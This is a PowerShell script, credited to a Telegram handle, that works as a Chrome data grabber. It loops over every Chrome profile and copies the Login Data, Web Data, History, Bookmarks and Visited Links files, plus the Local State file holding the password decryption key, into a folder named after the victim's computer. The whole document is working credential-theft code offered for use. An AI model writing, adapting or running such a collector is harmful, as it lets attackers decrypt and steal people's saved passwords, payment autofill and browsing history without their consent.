# Author: BoyFromBD
# Telegram: http://t.me/heartcrafter

function Get-ProfileCount {
    $profiles = Get-ChildItem "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\" -Directory | Where-Object { $_.Name -match '^(Default|Profile \d+)$' }
    $profileCount = ($profiles | Measure-Object).Count
    return $profileCount
}
function Copy-ChromeData {
    param (
        [string]$sourceProfile,
        [string]$destinationFolder
    )
    $filesToCopy = @("History", "Bookmarks", "Web Data", "Visited Links", "Login Data")

    # Set source path
    $source = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\$sourceProfile\"

    # Set the final path to store all files
    $finatPath = "$PSScriptRoot\$destinationFolder\$sourceProfile\"

    # Create the destination directory
    New-Item -Path $finatPath -ItemType Directory -Force

    # Copy files to the destination directory
    foreach ($file in $filesToCopy) {
        Copy-Item -Path "$source$file" -Destination $finatPath -Force
    }
}

# Get the profile count
$profileCount = Get-ProfileCount

# Copy data from the default profile
Copy-ChromeData -sourceProfile "Default" -destinationFolder "$env:COMPUTERNAME"

# Copy data from all profiles
for ($i = 1; $i -le $profileCount - 1; $i++) {
    Copy-ChromeData -sourceProfile "Profile $i" -destinationFolder "$env:COMPUTERNAME"
}
function Copy-LocalStateFile {
    $chromePath = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
    $localStatePath = Join-Path $chromePath "Local State"
    $destinationPath = Join-Path $PSScriptRoot "$env:COMPUTERNAME"

    if (Test-Path $localStatePath) {
        Copy-Item -Path $localStatePath -Destination $destinationPath -Force
    }
    else {
        Write-Host "Local State file not found."
    }
}
# Copy the "Local State" file
Copy-LocalStateFile

